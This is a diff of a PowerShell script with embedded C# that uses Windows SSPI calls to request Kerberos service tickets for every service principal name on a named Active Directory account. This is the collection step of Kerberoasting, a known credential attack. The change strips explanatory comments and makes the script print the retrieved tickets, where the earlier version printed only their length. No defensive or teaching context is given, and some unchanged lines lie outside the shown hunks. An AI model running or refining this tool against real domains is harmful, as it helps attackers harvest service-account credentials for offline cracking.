@@ -1,4 +1,3 @@
-# Add the C# class for Kerberos ticket request
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -76,7 +75,7 @@ public class K {
             if (AcquireCredentialsHandle(
                     null,
                     "Kerberos",
-                    0x00000002, // SECPKG_CRED_OUTBOUND
+                    0x00000002,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -89,7 +88,7 @@ public class K {
                     cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
+                    0x00001000,
                     0,
                     16,
                     IntPtr.Zero,
@@ -122,35 +121,38 @@ public class K {
 "@
 
 function Get-KerberosTicketBySamAccountName {
-    param (
-        [Parameter(Mandatory=$true)][string]$SamAccountName,
-        [Parameter(Mandatory=$true)][array]$Users
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory)]
+        [string]$SamAccountName
     )
 
-    $user = $Users | Where-Object { $_.Properties.samaccountname -eq $SamAccountName }
-
-    if (-not $user) {
-        Write-Warning "User with samaccountname '$SamAccountName' not found."
-        return
-    }
-
-    $spns = $user.Properties.serviceprincipalname
-    if (-not $spns) {
-        Write-Warning "No SPNs found for user '$SamAccountName'."
-        return
-    }
-
-    foreach ($spn in $spns) {
-        Write-Host "`n[+] Requesting TGS for SPN: ${spn}" -ForegroundColor Cyan
-        try {
-            $ticket = [K]::GetTicket($spn)
-            if ($ticket) {
-                Write-Host "    [OK] Ticket acquired, length: $($ticket.Length) bytes"
-            } else {
-                Write-Warning "    [!] Failed to request ticket for ${spn}"
-            }
-        } catch {
-            Write-Warning "    [!] Error requesting ticket for ${spn}: $_"
+    try {
+        $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
+        if (-not $user) {
+            Write-Error "User '$SamAccountName' not found in Active Directory."
+            return
         }
+
+        if (-not $user.servicePrincipalName) {
+            Write-Warning "No SPNs found for '$SamAccountName'."
+            return
+        }
+
+        foreach ($spn in $user.servicePrincipalName) {
+            try {
+                Write-Host "Requesting ticket for SPN: ${spn}"
+                $ticket = [K]::GetTicket($spn)
+                if ($ticket) {
+                    Write-Output "Kerberos ticket for ${spn}: $ticket"
+                } else {
+                    Write-Warning "Failed to retrieve ticket for ${spn}."
+                }
+            } catch {
+                Write-Warning "Exception while requesting ticket for ${spn}: $_"
+            }
+        }
+    } catch {
+        Write-Error "Error while querying Active Directory or processing SPNs: $_"
     }
 }
